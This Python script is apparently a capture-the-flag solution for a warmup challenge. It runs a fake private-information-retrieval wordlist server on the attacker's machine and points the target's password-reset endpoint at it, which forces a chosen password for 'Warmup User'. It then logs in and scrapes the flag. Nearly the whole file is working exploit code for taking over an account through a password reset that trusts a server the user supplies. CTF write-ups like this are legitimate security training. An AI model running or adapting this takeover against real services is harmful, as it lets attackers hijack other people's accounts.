"""
Flag 1 (warmup): the PIR server is untrusted.

reset_password(username, wordlist=URL) lets us point the lookup at a wordlist
server we control. The password manager trusts whatever word our "server" decodes
to, so we hand back a response that decodes to a word of our choosing for every
lookup. The new password becomes that word repeated PASSPHRASE_LENGTH times; then
we just log in and read the flag.

Usage: python warmup.py <WEB_IP> <MY_VPN_IP> [PORT]
"""
import http.server, re, socketserver, sys, threading, time
import urllib.parse, urllib.request, http.cookiejar
from pir import build_response, parse_query_n

WEB_IP, MY_IP = sys.argv[1], sys.argv[2]
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 9999
WEB = f"http://{WEB_IP}:8081"
WORD = b"zzzz"
PASSWORD = " ".join([WORD.decode()] * 6)
PIR_RESP = "X-Application-Private-Information-Retrieval-Response"


class Server(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        resp = build_response(parse_query_n(body), WORD)
        self.send_response(200)
        self.send_header("Content-Type", PIR_RESP)
        self.send_header("Content-Length", str(len(resp)))
        self.end_headers()
        self.wfile.write(resp)

socketserver.TCPServer.allow_reuse_address = True
threading.Thread(target=lambda: socketserver.TCPServer(("0.0.0.0", PORT), Server).serve_forever(),
                 daemon=True).start()
time.sleep(0.4)
print(f"[*] fake wordlist server on 0.0.0.0:{PORT}, forcing every word to {WORD!r}")

jar = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
def post(path, data):
    req = urllib.request.Request(WEB + path, urllib.parse.urlencode(data).encode(), method="POST")
    try:
        with op.open(req, timeout=60) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")

print("[*] resetting 'Warmup User' through our server...")
print("   reset:", post("/reset_password", {"username": "Warmup User",
                                             "wordlist": f"http://{MY_IP}:{PORT}/wl"})[0])
print("[*] logging in with", PASSWORD)
post("/login", {"username": "Warmup User", "password": PASSWORD})
body = op.open(WEB + "/", timeout=60).read().decode(errors="replace")
print("[+] flag:", re.findall(r"PP\{[^}]*\}", body))
